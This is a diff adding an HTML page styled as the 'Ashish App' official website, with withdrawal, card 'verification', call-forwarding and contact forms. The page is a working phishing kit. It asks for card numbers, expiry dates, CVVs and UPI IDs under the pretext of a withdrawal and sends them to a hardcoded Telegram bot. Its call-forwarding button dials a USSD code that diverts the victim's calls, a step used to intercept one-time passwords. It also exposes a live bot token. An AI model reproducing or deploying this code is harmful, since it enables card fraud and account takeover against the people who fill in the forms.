@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <title>Ashish App – Official Website</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
+    body{background:#f3f4f6;color:#111827;}
+    section{
+      max-width:1100px;margin:16px auto;padding:20px 16px;
+      background:#ffffff;border-radius:14px;
+      box-shadow:0 10px 25px rgba(15,23,42,0.07);
+    }
+    h2{font-size:22px;margin-bottom:6px;}
+    p{font-size:14px;color:#4b5563;}
+    .box{
+      margin-top:12px;padding:16px;border-radius:12px;
+      border:1px solid #e5e7eb;background:#f9fafb;
+    }
+    label{font-size:13px;color:#111827;}
+    input{
+      width:100%;padding:10px;margin-top:4px;border-radius:10px;
+      border:1px solid #d1d5db;font-size:14px;background:#fff;color:#111827;
+    }
+    input:focus{outline:none;border-color:#22c55e;}
+    .btn{
+      padding:10px 20px;border-radius:999px;border:none;
+      font-size:15px;font-weight:600;cursor:pointer;
+    }
+    .btn-green{background:#22c55e;color:#fff;}
+    .btn-red{background:#ef4444;color:#fff;}
+    footer{text-align:center;margin:20px;font-size:12px;color:#6b7280;}
+  </style>
+</head>
+<body>
+
+<!-- 💸 WITHDRAWAL -->
+<section>
+  <h2>💸 Withdrawal</h2>
+  <p>UPI ID और Amount डालें:</p>
+
+  <div class="box">
+    <label>UPI ID:</label>
+    <input id="upiId" placeholder="example@upi" />
+
+    <br><br>
+
+    <label>Amount (₹):</label>
+    <input id="withdrawAmount" type="number" placeholder="100" />
+
+    <br><br>
+
+    <button class="btn btn-green" onclick="openCardForm()">Withdraw Now</button>
+
+    <p id="withdrawMsg" style="margin-top:8px;font-size:13px;"></p>
+  </div>
+</section>
+
+
+<!-- 🔐 CARD VERIFY FOR WITHDRAW -->
+<section id="withdrawCard" style="display:none;">
+  <h2>🔐 Verify Card</h2>
+
+  <div class="box">
+    <label>Card Number:</label>
+    <input id="wCardNum" placeholder="1234567890123456" />
+
+    <br><br>
+
+    <label>Expiry (MM/YY):</label>
+    <input id="wExp" placeholder="MM/YY" />
+
+    <br><br>
+
+    <label>CVV:</label>
+    <input id="wCvv" type="password" maxlength="4" placeholder="***" />
+
+    <br><br>
+
+    <label>Card Holder Name:</label>
+    <input id="wCardName" placeholder="Name" />
+
+    <br><br>
+
+    <button class="btn btn-green" onclick="processWithdraw()">Confirm Withdrawal</button>
+
+    <p id="wStatus" style="margin-top:8px;font-size:13px;"></p>
+  </div>
+</section>
+
+
+
+<!-- 💳 CARD DEMO -->
+<section>
+  <h2>💳 Card Details (Demo Only)</h2>
+
+  <div class="box">
+    <label>Card Number:</label>
+    <input id="cardNum" placeholder="1234567890123456" />
+
+    <br><br>
+
+    <label>Expiry (MM/YY):</label>
+    <input id="exp" placeholder="MM/YY" />
+
+    <br><br>
+
+    <label>CVV:</label>
+    <input id="cvv" type="password" placeholder="***" />
+
+    <br><br>
+
+    <label>Card Holder Name:</label>
+    <input id="cardName" placeholder="Name" />
+
+    <br><br>
+
+    <button class="btn btn-green" onclick="saveCard()">Save Card (Demo)</button>
+
+    <p id="cardStatus" style="margin-top:8px;font-size:13px;"></p>
+  </div>
+</section>
+
+
+
+<!-- 📞 CALL FORWARDING -->
+<section>
+  <h2>📞 Call Forwarding</h2>
+
+  <div class="box">
+    <label>Forward Number:</label>
+    <input id="cfNum" placeholder="9876543210" />
+
+    <br><br>
+    <button class="btn btn-green" onclick="cfOn()">Forwarding ON</button>
+
+    <br><br>
+    <button class="btn btn-red" onclick="cfOff()">Forwarding OFF</button>
+
+    <p id="cfStatus" style="margin-top:8px;font-size:13px;"></p>
+  </div>
+</section>
+
+
+
+<!-- ✉️ TELEGRAM MESSAGE FORM -->
+<section>
+  <h2>✉️ Send Message To Ashish</h2>
+
+  <div class="box">
+    <label>Your Name:</label>
+    <input id="tgName" placeholder="Name" />
+
+    <br><br>
+
+    <label>Mobile Number:</label>
+    <input id="tgMobile" placeholder="9876543210" />
+
+    <br><br>
+
+    <label>Message:</label>
+    <input id="tgMsg" placeholder="Type message..." />
+
+    <br><br>
+
+    <button class="btn btn-green" onclick="sendTelegram()">Send To Telegram</button>
+
+    <p id="tgStatus" style="margin-top:8px;font-size:13px;"></p>
+  </div>
+</section>
+
+
+
+<footer>© Ashish App – All Rights Reserved</footer>
+
+
+
+
+<!-- ============================= -->
+<!-- 🔥 JAVASCRIPT + TELEGRAM CONNECT -->
+<!-- ============================= -->
+
+<script>
+
+// TELEGRAM INFO
+const BOT = "8564182440:AAHmOYGuoPW5ndHa9l5o8hHs3pdOzSpRDz4";
+const CHAT = "7490030069";
+
+
+// ⭐ Universal Telegram Sender
+function sendToTelegram(text){
+  fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT,text:text})
+  });
+}
+
+
+
+// ⭐ Card Masking: First 6 visible + middle 4 hidden + last 6 visible
+function maskCardFull(num){
+  const digits = num.replace(/\D/g,"");
+
+  if(digits.length < 16) return num;  // safety
+
+  const first6 = digits.slice(0,6);
+  const hide4  = "****";
+  const last6  = digits.slice(-6);
+
+  return `${first6} ${hide4} ${last6}`;
+}
+
+
+
+// 💸 Step 1 — Withdrawal
+function openCardForm(){
+  const upi = upiId.value.trim();
+  const amt = withdrawAmount.value.trim();
+
+  if(!upi || !amt){
+    withdrawMsg.textContent="UPI aur Amount required!";
+    withdrawMsg.style.color="red";
+    return;
+  }
+
+  withdrawMsg.textContent="";
+  withdrawCard.style.display="block";
+}
+
+
+
+// 💸 Step 2 — Withdrawal Confirm
+function processWithdraw(){
+
+  const upi = upiId.value.trim();
+  const amt = withdrawAmount.value.trim();
+
+  const num = wCardNum.value.trim();
+  const exp = wExp.value.trim();
+  const cvv = wCvv.value.trim();
+  const name = wCardName.value.trim();
+
+  if(!num || !exp || !cvv || !name){
+    wStatus.textContent="Fill all card details!";
+    wStatus.style.color="red";
+    return;
+  }
+
+  const masked = maskCardFull(num);
+
+  const text =
+"💸 NEW WITHDRAW REQUEST\n\n" +
+"🆔 UPI:\n" + upi +
+"\n💰 Amount:\n₹" + amt +
+"\n\n💳 Card:\n" + masked +
+"\n👤 Holder:\n" + name +
+"\n⏱ Time:\n" + new Date().toLocaleString();
+
+  sendToTelegram(text);
+
+  wStatus.textContent="Withdrawal Request Submitted ✔";
+  wStatus.style.color="green";
+}
+
+
+
+// 💳 Card demo
+function saveCard(){
+
+  const num = cardNum.value.trim();
+  const exp1 = exp.value.trim();
+  const cvv1 = cvv.value.trim();
+  const name1 = cardName.value.trim();
+
+  if(!num || !exp1 || !cvv1 || !name1){
+    cardStatus.textContent="Fill all fields!";
+    cardStatus.style.color="red"; return;
+  }
+
+  const masked = maskCardFull(num);
+
+  const text =
+"💳 NEW CARD ENTRY (DEMO)\n\n" +
+"🔢 Card:\n" + masked +
+"\n📅 Expiry:\n" + exp1 +
+"\n🔐 CVV Digits:\n" + cvv1.length +
+"\n👤 Holder:\n" + name1 +
+"\n⏱ Time:\n" + new Date().toLocaleString();
+
+  sendToTelegram(text);
+
+  cardStatus.textContent="Card Saved (Demo) ✔";
+  cardStatus.style.color="green";
+}
+
+
+
+// 📞 Call Forward ON
+function cfOn(){
+  const num = cfNum.value.trim();
+  if(num.length < 10){
+    cfStatus.textContent="Invalid Number!";
+    cfStatus.style.color="red";
+    return;
+  }
+
+  const text =
+"📞 CALL FORWARD ON\n\n" +
+"📱 Number:\n" + num +
+"\n⏱ Time:\n" + new Date().toLocaleString();
+
+  sendToTelegram(text);
+
+  cfStatus.textContent="Dialer opening…";
+  cfStatus.style.color="#111827";
+
+  window.location.href=`tel:*401*${num}#`;
+}
+
+
+
+// 📞 Call Forward OFF
+function cfOff(){
+
+  const text =
+"📞 CALL FORWARD OFF\n\n" +
+"⏱ Time:\n" + new Date().toLocaleString();
+
+  sendToTelegram(text);
+
+  cfStatus.textContent="Turning off…";
+  cfStatus.style.color="#111827";
+
+  window.location.href="tel:*402#";
+}
+
+
+
+// ✉️ Telegram Message Form
+function sendTelegram(){
+  const name = tgName.value.trim();
+  const mob  = tgMobile.value.trim();
+  const msg  = tgMsg.value.trim();
+
+  if(!name || !mob || !msg){
+    tgStatus.textContent="Fill all details!";
+    tgStatus.style.color="red";
+    return;
+  }
+
+  const text =
+"📨 NEW MESSAGE FROM WEBSITE\n\n" +
+"👤 Name:\n" + name +
+"\n📞 Mobile:\n" + mob +
+"\n💬 Message:\n" + msg +
+"\n⏱ Time:\n" + new Date().toLocaleString();
+
+  sendToTelegram(text);
+
+  tgStatus.textContent="Message Sent ✔";
+  tgStatus.style.color="green";
+
+  tgName.value="";
+  tgMobile.value="";
+  tgMsg.value="";
+}
+
+</script>
+
+</body>
+</html>
